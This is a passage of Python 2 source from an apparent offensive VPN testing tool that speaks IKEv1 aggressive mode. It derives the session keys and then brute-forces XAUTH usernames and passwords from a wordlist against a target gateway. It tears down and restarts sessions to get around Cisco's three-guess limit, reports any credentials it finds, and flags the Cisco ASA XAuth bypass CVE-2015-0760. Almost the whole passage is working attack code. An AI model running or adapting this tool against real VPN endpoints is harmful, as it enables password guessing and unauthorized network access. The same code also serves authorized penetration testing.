			DHPubKey_r = dicCrypto["DHPubKey_r"]
			SA_i = dicCrypto["SA_i"]

			#Check exchange type is in the right format
			try:
				xType = hex(xType)[2:].zfill(2)
			except:
				pass
			
			#Construct final aggressive mode exchange packet
			if debug > 0:
				print "\n--------------------Sending second aggressive mode packet--------------------"
			#Run Crypto Functions - DH first
			ikeDH = dh.DiffieHellman(DHGroup)
			secret = ikeDH.genSecret(privKey,int(DHPubKey_r,16))
			hexSecret = '{0:x}'.format(secret)#using new formating to deal with long int, if this fails fallback to old style
			if len(hexSecret) % 2 != 0:
				hexSecret = "0" + hexSecret
			if debug > 0:
				print "Secret: %s"%secret
				print "Hexlified Secret: %s"%hexSecret

			skeyid = ikeCrypto.calcSKEYID(psk, nonce_i.decode('hex'), nonce_r.decode('hex'), hashType)
			hash_i = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'), ID_r.decode('hex'), ID_i.decode('hex'),"i",hashType)
			hash_r = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'),ID_r.decode('hex'), ID_i.decode('hex'),"r",hashType)
			skeyid_d = ikeCrypto.calcSKEYID_d(skeyid, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			skeyid_a = ikeCrypto.calcSKEYID_a(skeyid, skeyid_d, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			skeyid_e = ikeCrypto.calcSKEYID_e(skeyid, skeyid_a, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			if len(skeyid_e) < keyLen:   
				encKey = ikeCrypto.calcKa(skeyid_e, keyLen, hashType)
	                        if debug > 0:
                                        print "Encryption Key: %s"%encKey.encode('hex')
			else:
				encKey = skeyid_e[:keyLen]
				if debug > 0:
					print "Encryption Key: %s"%encKey.encode('hex')
			initIV = ikeCrypto.calcIV(DHPubKey_i.decode('hex'),DHPubKey_r.decode('hex'), IVlen, hashType)
			
			dicCrypto["skeyid"] = skeyid
			dicCrypto["skeyid_a"] = skeyid_a
			dicCrypto["skeyid_d"] = skeyid_d
			dicCrypto["skeyid_e"] = skeyid_e
			dicCrypto["encKey"] = encKey
			dicCrypto["initIV"] = initIV
			#Hash payload
			arrayHash = ikeneg.ikeHash("0d",hash_i)#next payload - VID (13)
                        lenHash = len(arrayHash)
                        bytesHash = struct.pack(("B"*lenHash),*arrayHash)
			#VID payload
			arrayVID = ikeneg.ikeVID("00","09002689dfd6b712")
                        lenVID = len(arrayVID)
                        bytesVID = struct.pack(("B"*lenVID),*arrayVID)
                        #Encrypt everything but the header
			plainData = bytesHash+bytesVID
			plainPayload = ikeCrypto.calcPadding(encType, plainData)
			if debug > 0: 
                                print "Plain-text Payload: %s"%plainPayload.encode('hex')
				
                        cipher = ikeCrypto.ikeCipher(encKey, initIV, encType)
                        encPayload = cipher.encrypt(plainPayload)
			
			if debug > 0:
				print "Encrypted Payload: %s"%encPayload.encode('hex')

        		arrayencPayload = array.array('B', encPayload)
			lenencPayload = len(arrayencPayload)
			bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
			arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
			lenHDR = len(arrayHDR)
			bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
      	  		bytesIKE = bytesHDR+bytesencPayload
			ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
			dicCrypto["p2IV"] = bytesIKE.encode('hex')[-IVlen:]
                        dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]#p2IV and last block are the same at this point
			while len(packets) < 2:
				time.sleep(0.5)
					
                if len(packets) == 2:
			#Parse the header first
		        ikeHandling = ikehandler.IKEv1Handler(debug)
		        ikeHDR = ikeHandling.parseHeader(packets[-1])
			#Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
				if debug > 0:
	                                print "Packet received does not match this session, this is probably from a previous incarnation."
					print "Removing packet"
                                del packets[-1]
                                continue

			#Check for a new Message ID
			try:
				if ikeHDR[5] == dicCrypto["msgID"]:
					if debug > 0:
						print "Message ID has not changed"	
				
					curIV = dicCrypto["lastBlock"].decode('hex')
                        	        pass
                        	else:
					if debug > 0:
        	                        	print "Message ID has changed, recalculating IV"
					msgID = ikeHDR[5]
					curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)				
                        	        pass
			except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()

                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."
				try:
					respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                                except:
					respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
                                time.sleep(2)
                                exit()
                        else:
                                pass

			#Parse full packet
			respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
			#Update state/crypto dictionary
			dicCrypto.update(respDict) 
			dicCrypto["lastBlock"] = packets[-1][-IVlen:]
                        #Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
                        nonce_r = dicCrypto["nonce_r"]
                        ID_i = dicCrypto["ID_i"]
                        ID_r = dicCrypto["ID_r"]
                        rCookie = dicCrypto["rCookie"]
			iCookie = dicCrypto["iCookie"]
                        msgID = dicCrypto["msgID"]
                        privKey = dicCrypto["privKey"] 
                        DHPubKey_r = dicCrypto["DHPubKey_r"]
                        SA_i = dicCrypto["SA_i"]
			xType = int(dicCrypto["xType"])
                        if xType != 6:
                                print "Expected Mode Config Transaction packet."
                                print "Exiting...\n"
				time.sleep(2)
                                exit()
			else:
				pass

			try:
				guessno
				wordline += 3
				guessno = 0
			except:
				wordline = 0
				guessno = 0


			for w in wordsfile:
				passcount += 1
				password = w.strip()
				#Print update if return is pressed
				readInput = [sys.stdin]
				inp = select.select(readInput, [], [], 0.1)[0]
				if inp:
					percent = wordline / float(wordcount) * 100
                                	print "Current Guess: %s:%s (%s%%)\n"%(username,password,int(percent))
					tcflush(sys.stdin, TCIOFLUSH)
					
				else:
					pass
				#Count number of guesses to reset connection after 3 for Cisco devices
				guessno += 1
				#Process response packet
				if debug > 0:
					print "\n--------------------Sending third packet - Encrypted XAUTH reply (username: %s password: %s)--------------------"%(username,password)
				xType = "06" #Mode Config transation			
                        	#Xauth Attributes data
				try:
					vendorType
	                                if vendorType == "cisco":
	                                	typeXAUTH = ikeneg.ikeXAUTH(0,16520,0,vendorType)
						userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
	                                	passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
	                                	mcfgAtts = typeXAUTH+userXAUTH+passXAUTH
	                                else:
	                                        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
	                                        passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
	                                        mcfgAtts = userXAUTH+passXAUTH
                                except:
                                        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
                                        passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
                                        mcfgAtts = userXAUTH+passXAUTH

				#Mode Config payload
				arrayMCFG = ikeneg.ikeModeCFG("00","02",mcfgAtts) #02 = mode config reply
	                        lenMCFG = len(arrayMCFG)
	                        bytesMCFG = struct.pack(("B"*lenMCFG),*arrayMCFG)
	
				#Mode Config Hash payload
				skeyid_a = dicCrypto["skeyid_a"]
				mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
				if debug > 0:
					print "Mode Config Hash = %s"%mcfgHash
	                        arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
	                        lenHash = len(arrayHash)
	                        bytesHash = struct.pack(("B"*lenHash),*arrayHash)

	                        #Encrypt everything but the header
	                        plainData = (bytesHash+bytesMCFG)
	                        plainPayload = ikeCrypto.calcPadding(encType, plainData)
	                        if debug > 0:
	                                print "Plain-text Payload: %s"%plainPayload.encode('hex')

				#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
	                        cipher = ikeCrypto.ikeCipher(encKey, dicCrypto["lastBlock"].decode('hex'), encType)
	                        encPayload = cipher.encrypt(plainPayload)

	                        if debug > 0:
	                                print "Encrypted Payload: %s"%encPayload.encode('hex')

	                        arrayencPayload = array.array('B', encPayload)
	                        lenencPayload = len(arrayencPayload)
	                        bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
	                        arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
	                        lenHDR = len(arrayHDR)
	                        bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
	                        bytesIKE = bytesHDR+bytesencPayload

	                        ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
				dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
				while len(packets) < 3:
					time.sleep(0.5)

						
                	        if len(packets) == 3:
	                        	#Parse the header first
	                        	ikeHandling = ikehandler.IKEv1Handler(debug)
	                        	ikeHDR = ikeHandling.parseHeader(packets[-1])
	                        	#Check the packet is for this session
	                        	if ikeHDR[1] == dicCrypto["iCookie"]:
	                        	        pass
	                        	else:   
						if debug > 0:
		                        	        print "Packet received does not match this session, this is probably from a previous incarnation."
							print "Removing packet"
	                        		del packets[-1]
	                        	        continue

	                        	try:   
	                        		#Check for a new Message ID
        	                        	if ikeHDR[5] == dicCrypto["msgID"]:
                	                	        if debug > 0:
                	                	                print "Message ID has not changed"
	
	                                	        curIV = dicCrypto["lastBlock"].decode('hex')
	                                	        pass    
       	                        		else:
                                        		if debug > 0:
                                        		        print "Message ID has changed, recalculating IV"
                                        		msgID = ikeHDR[5]
                                        		curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        		pass
                        		except:
                        	        	print "Invalid Message ID, too many concurrent sessions running. Wait 30 seconds and try again.\nExiting"
						time.sleep(2)
                                		exit()

                                        if ikeHDR[4] == 5:
                                                print "Informational packet received. Enable full debugging for more info. Exiting..."
						try:
							respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                                                except:
							respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
                                                time.sleep(2)
                                                exit()

			
	        		        respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
	        		        #Update state/crypto dictionary
					dicCrypto = dict(dicCrypto.items() + respDict.items())
	        		        dicCrypto["lastBlock"] = packets[-1][-IVlen:]
			                #Pull the useful values from stored dictionary for crypto functions
			                nonce_i = dicCrypto["nonce_i"]
			                DHPubKey_i = dicCrypto["DHPubKey_i"]
			       	        nonce_r = dicCrypto["nonce_r"]
			       	        ID_i = dicCrypto["ID_i"]
		                        ID_r = dicCrypto["ID_r"]
		                        rCookie = dicCrypto["rCookie"]
		                        iCookie = dicCrypto["iCookie"]
		                        msgID = dicCrypto["msgID"]
		                        privKey = dicCrypto["privKey"]
		                        DHPubKey_r = dicCrypto["DHPubKey_r"]
		                        SA_i = dicCrypto["SA_i"]
		                        xType = int(dicCrypto["xType"])
		                        if xType != 6:
		                                print "Expected Mode Config Transaction packet."
		                                print "Exiting...\n"
						time.sleep(2)
		                                exit()
		                        else:   
		                                pass
					if int(dicCrypto["mcfgType"]) == 1:
						if debug > 0:
							print "Retransmitted XAUTH request received, Continuing..."
						del packets[-1]
						continue

                                        if int(dicCrypto["mcfgType"]) == 3 and int(dicCrypto["XAUTH_STATUS"]) == 0:
						try:
							vendorType
						except:
							vendorType = "unknown"


						if vendorType == "cisco":
							if debug > 0:
								"XAUTH Authentication failed, restarting connection."
                                                        if guessno == 3 and passcount < wordcount:
                                                                if debug > 0:
                                                                        print "Cisco 3 guess limit reached, restarting"
	                        				xType = "05" #Informational
								#Process Delete payload
                                                                #Hash payload
                                                                arrayHash = ikeneg.ikeHash("0c",hash_i) # next payload - 12 (delete)
                                                                lenHash = len(arrayHash)
                                                                bytesHash = struct.pack(("B"*lenHash),*arrayHash)
									
								#Delete payload
								if debug > 0:
									        print "\n--------------------Sending Delete Packet--------------------"
								arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
								lenDel = len(arrayDel)
								bytesDel = struct.pack(("B"*lenDel),*arrayDel)

								#Encrypt everything but the header
                        					plainData = (bytesHash+bytesDel)
                        					plainPayload = ikeCrypto.calcPadding(encType, plainData)
                        					if debug > 0:
                        				        	print "Plain-text Payload: %s"%plainPayload.encode('hex')

         			               			#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
								#Calc message ID and current IV
								msgID = "0000111b"
								curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                        					cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                        					encPayload = cipher.encrypt(plainPayload)

                        					if debug > 0:
                        				        	print "Encrypted Payload: %s"%encPayload.encode('hex')
			
        	        			        	arrayencPayload = array.array('B', encPayload)
        	                				lenencPayload = len(arrayencPayload)
        	                				bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)

                                                                arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
                                                                lenHDR = len(arrayHDR)
                                                                bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)

								#Send Delete payload
								bytesIKE = bytesHDR+bytesencPayload
								ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
								if debug > 0:
									print "RESTARTING CISCO 3 LIMIT REACHED"
								del nonce_i,nonce_r,DHPubKey_i,ID_i,ID_r,rCookie,iCookie,msgID,privKey,DHPubKey_r,SA_i,xType,initIV,curIV
                                                                del packets[:]
								del dupPackets[:]
								del listVIDs[:]
								dicCrypto.clear()
                                                                respDict.clear()
                                                                initDict.clear()
								dicVIDs.clear()
								break
								
							else:
								pass
						else:
        	                                        pass

		                        if dicCrypto["mcfgType"] == "03" or dicCrypto["mcfgType"] == 3 and int(dicCrypto["XAUTH_STATUS"]) == 1:
						#Check for XAuth authentication bypass
                                                try:
                                                        aType = int(authType)
                                                except:
                                                        aType = int(authType,16)
                                                if vendorType == "cisco" and aType == 1 and wordline < 1:
                                                        print "[*]Cisco ASA is vulnerable to XAuth authentication bypass (CVE-2015-0760)"
							print "Run the tool again in connect (-c) mode to get the full key to use in the ESP connection. This can be used with the Linux IPSec kernel stack in much the same way as the *swans"
						else:
							print "[*]XAUTH Authentication Successful! Username: %s Password: %s\nSending ACK packet...\n"%(username,password)

		                                #Mode Config payload - ACK
		                                ackXAUTH = ikeneg.ikeXAUTH(0,16527,"00")
		                                mcfgAtts = ackXAUTH
		                                arrayMCFG = ikeneg.ikeModeCFG("00","04",mcfgAtts) #04 = mode config ACK
		                                lenMCFG = len(arrayMCFG)
		                                bytesMCFG = struct.pack(("B"*lenMCFG),*arrayMCFG)
			                        #Process response packet
						if debug > 0:
							print "\n--------------------Sending third packet - Encrypted XAUTH ACK ---------------------\n"
                        			xType = "06" #Mode Config transation

                        			#Hash payload
                        			skeyid_a = dicCrypto["skeyid_a"]
                        			mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
                        			if debug > 0:
                        			        print "Mode Config Hash = %s"%mcfgHash
                        			arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
                        			lenHash = len(arrayHash)
                        			bytesHash = struct.pack(("B"*lenHash),*arrayHash)

			                        #Encrypt everything but the header
                			        plainData = (bytesHash+bytesMCFG)
                        			plainPayload = ikeCrypto.calcPadding(encType, plainData)
                        			if debug > 0:
                                			print "Plain-text Payload: %s"%plainPayload.encode('hex')

                        			#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                        			cipher = ikeCrypto.ikeCipher(encKey, dicCrypto["lastBlock"].decode('hex'), encType)
                        			encPayload = cipher.encrypt(plainPayload)

                        			if debug > 0:
                                			print "Encrypted Payload: %s"%encPayload.encode('hex')

                        			arrayencPayload = array.array('B', encPayload)
                        			lenencPayload = len(arrayencPayload)
                        			bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
                        			arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
                        			lenHDR = len(arrayHDR)
                        			bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
                        			bytesIKE = bytesHDR+bytesencPayload
						
						#Send ACK packet
                        			ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                        			dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
			                        time.sleep(1)

		                                #Delete payload
                                		arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
                                		lenDel = len(arrayDel)
                                		bytesDel = struct.pack(("B"*lenDel),*arrayDel)

                                		#Encrypt everything but the header
                                		plainData = (bytesHash+bytesDel)
                                		plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                		if debug > 0:
                                		        print "Plain-text Payload: %s"%plainPayload.encode('hex')
	
                                		#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                		#Calc message ID and current IV
                                		msgID = "0000111b"
                                		curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                		cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                		encPayload = cipher.encrypt(plainPayload)
                                		if debug > 0:
                                        		print "Encrypted Payload: %s"%encPayload.encode('hex')

                                		arrayencPayload = array.array('B', encPayload)
                                		lenencPayload = len(arrayencPayload)
                                		bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)

                                		arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
                                		lenHDR = len(arrayHDR)
                                		bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)

                                		#Send Delete payload
                                		bytesIKE = bytesHDR+bytesencPayload
                                		ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                        			time.sleep(2)
						exit()
				

					if dicCrypto["mcfgType"] == "03" or dicCrypto["mcfgType"] == 3 and int(dicCrypto["XAUTH_STATUS"]) == 0:
						del packets[-2]
						pass

					else:
						#Check packet is for this session
                                        	if ikeHDR[1] == dicCrypto["iCookie"]:
                                        		pass
                                        	else:
                                                	if debug > 0:
                                                        	print "Packet received does not match this session, this is probably from a previous incarnation."
                                                        	print "Removing packet"
                                                	del packets[-1]
                                                	continue

						#Exit on receiving informational packet
						if ikeHDR[4] == 5:
							print "Informational packet received. Enable full debugging for more info. Exiting..."
							try:
								respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
							except:
								respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
							time.sleep(2)
							exit()
						else:
							pass
						pass

                        if passcount != 0 and passcount == wordcount:
                                print "[-]Password not found. Trying next user...\n"
                                xType = "05" #Informational
                                #Process Delete payload
                                #Hash payload
                                if debug > 0:
                                        print "Sending Delete payload to reset connection"
                                arrayHash = ikeneg.ikeHash("0c",hash_i) # next payload - 12 (delete)
                                lenHash = len(arrayHash)
                                bytesHash = struct.pack(("B"*lenHash),*arrayHash)

                                #Delete payload
                                arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
                                lenDel = len(arrayDel)
                                bytesDel = struct.pack(("B"*lenDel),*arrayDel)

                                #Encrypt everything but the header
                                plainData = (bytesHash+bytesDel)                                 
                                plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                if debug > 0:
                                        print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                #Calc message ID and current IV
                                msgID = "0000111b"
                                curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                encPayload = cipher.encrypt(plainPayload)
                                if debug > 0:
                                        print "Encrypted Payload: %s"%encPayload.encode('hex')

                                arrayencPayload = array.array('B', encPayload)
                                lenencPayload = len(arrayencPayload)
                                bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)

                                arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
                                lenHDR = len(arrayHDR)
                                bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)

                                #Send Delete payload
                                bytesIKE = bytesHDR+bytesencPayload
                                ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                                del nonce_i,nonce_r,DHPubKey_i,ID_i,ID_r,rCookie,iCookie,msgID,privKey,DHPubKey_r,SA_i,xType,initIV,curIV
                                del packets[:]
                                del dupPackets[:]
                                del listVIDs[:]
                                dicCrypto.clear()
                                respDict.clear()
                                initDict.clear()
                                dicVIDs.clear()
                                break

			else:
				pass

		else:
                        if debug > 0:
                                print "Response received, processing packet..."
                        #Parse the header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])


                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:   
				if debug > 0:
	                                print "Packet received does not match this session, this is probably from a previous incarnation."
					print "Removing packet"
                                del packets[-1]
                                continue

                        try:   
                                if ikeHDR[5] == dicCrypto["msgID"]:
                                        if debug > 0:
                                                print "Message ID has not changed"

                                        curIV = dicCrypto["lastBlock"].decode('hex')
                                        pass    
                                else:
                                        if debug > 0:
                                                print "Message ID has changed, recalculating IV"
                                        msgID = ikeHDR[5]
                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        pass
                        except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()

                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."
				try:
					respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                                except:
					respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
                                time.sleep(2)
                                exit()
			else:
				pass

                        respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                        #Update state/crypto dictionary
                        dicCrypto.update(respDict)
                        dicCrypto["lastBlock"] = packets[-1][-IVlen:]

	      #Exit if while condition is not met (eof)
	      print "[-]Password not found, try another wordlist. Exiting...\n"
	      time.sleep(2)
	      exit()

	     #Else use a single user
	     else:
	      while passcount < wordcount:
		if len(packets) == 0:
			if debug > 0:
				print "\n--------------------Sending first Aggressive Mode packet--------------------"
			try:
				iCookie
			except:
				iCookie = ikeneg.secRandom(8).encode('hex')
			try:
				rCookie
			except:
				rCookie = "0000000000000000"

			initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,keyLen)
			time.sleep(speed)
			dicCrypto = dict(initDict.items())
			while len(packets) < 1:
				time.sleep(0.2)

		if len(packets) == 1:
			if debug > 0:
				print "Response received, processing packet..."

                        #Parse the header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])
                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
                                if debug > 0:
                                        print "Packet received does not match this session, this is probably from a previous incarnation"
                                        print "Removing packet"
                                del packets[-1]
                                continue

                        #Check for informational packet
                        if ikeHDR[4] == 5:
				try:
					respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
				except:
                                	respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
                                if respDict["notmsgType"] == 16:
                                        if debug > 0:
                                        	print "Malformed Payload message received - retrying"
                                        	print "(%s:%s)"%(username,password)

                                	xType = "05" #Informational
                                	#Process Delete payload
                                	#Hash payload
                                	if debug > 0:
                                	        print "Sending Delete payload to reset connection"
                                	arrayHash = ikeneg.ikeHash("0c",hash_i) # next payload - 12 (delete)
                                	lenHash = len(arrayHash)
                                	bytesHash = struct.pack(("B"*lenHash),*arrayHash)
                                	#Delete payload
                                	arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
                                	lenDel = len(arrayDel)
                                	bytesDel = struct.pack(("B"*lenDel),*arrayDel)
	
                                	#Encrypt everything but the header
                                	plainData = (bytesHash+bytesDel)
                                	plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                	if debug > 0:
                                	        print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                	#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                	#Calc message ID and current IV
                                	msgID = "0000111b"
                                	curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                	cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                	encPayload = cipher.encrypt(plainPayload)
                                	if debug > 0:
                                	        print "Encrypted Payload: %s"%encPayload.encode('hex')

                                	arrayencPayload = array.array('B', encPayload)
                                	lenencPayload = len(arrayencPayload)
                                	bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)

                                	arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
                                	lenHDR = len(arrayHDR)
                                	bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)

                                	#Send Delete payload
                                	bytesIKE = bytesHDR+bytesencPayload
                                	ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                                        time.sleep(5)
					del nonce_i,nonce_r,DHPubKey_i,ID_i,ID_r,rCookie,iCookie,msgID,privKey,DHPubKey_r,SA_i,xType,initIV,curIV
                                        del packets[:]
                                        del dupPackets[:]
                                        del listVIDs[:]
                                        dicCrypto.clear()
                                        respDict.clear()
                                        initDict.clear()
                                        dicVIDs.clear()
                                        continue


                                else:
                                        print "Informational packet received. Enable full debugging for more info. Exiting..."
                                        time.sleep(2) 
                                        exit()

                        else:
                                pass

			flags = "01"
			ikeHandling = ikehandler.IKEv1Handler(debug)
			respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
			dicVIDs = vid.dicVIDs
			for i in listVIDs:
				try:
					if debug > 0:
						print "VID received: %s (%s)"%(dicVIDs[i], i)
					if "Cisco" in dicVIDs[i]:
						vendorType = "cisco"
				except:
					if debug > 0:
						print "Unknown VID received: %s"%i
	

			#Combine the dictionaries from sent packet and received packet
			dicCrypto.update(respDict)
			#Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
			nonce_r = dicCrypto["nonce_r"]
			ID_i = dicCrypto["ID_i"]
			ID_r = dicCrypto["ID_r"]
			rCookie = dicCrypto["rCookie"]
			xType = dicCrypto["xType"]
			msgID = dicCrypto["msgID"]
			privKey = dicCrypto["privKey"]
			DHPubKey_r = dicCrypto["DHPubKey_r"]
			SA_i = dicCrypto["SA_i"]

			#Check exchange type is in the right format
			try:
				xType = hex(xType)[2:].zfill(2)
			except:
				pass
			
			#Construct final aggressive mode exchange packet
			if debug > 0:
				print "\n--------------------Sending second Aggressive Mode packet--------------------"
			#Run Crypto Functions - DH first
			ikeDH = dh.DiffieHellman(DHGroup)
			secret = ikeDH.genSecret(privKey,int(DHPubKey_r,16))
			hexSecret = '{0:x}'.format(secret)#using new formating to deal with long int, if this fails fallback to old style
			if len(hexSecret) % 2 != 0:
				hexSecret = "0" + hexSecret
			if debug > 0:
				print "Secret: %s"%secret
				print "Hexlified Secret: %s"%hexSecret

			skeyid = ikeCrypto.calcSKEYID(psk, nonce_i.decode('hex'), nonce_r.decode('hex'), hashType)
			hash_i = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'), ID_r.decode('hex'), ID_i.decode('hex'),"i",hashType)
			hash_r = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'),ID_r.decode('hex'), ID_i.decode('hex'),"r",hashType)
			skeyid_d = ikeCrypto.calcSKEYID_d(skeyid, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			skeyid_a = ikeCrypto.calcSKEYID_a(skeyid, skeyid_d, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			skeyid_e = ikeCrypto.calcSKEYID_e(skeyid, skeyid_a, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			if len(skeyid_e) < keyLen:   
				encKey = ikeCrypto.calcKa(skeyid_e, keyLen, hashType)
                                if debug > 0:
                                        print "Encryption Key: %s"%encKey.encode('hex')
			else:
				encKey = skeyid_e[:keyLen]
				if debug > 0:
					print "Encryption Key: %s"%encKey.encode('hex')
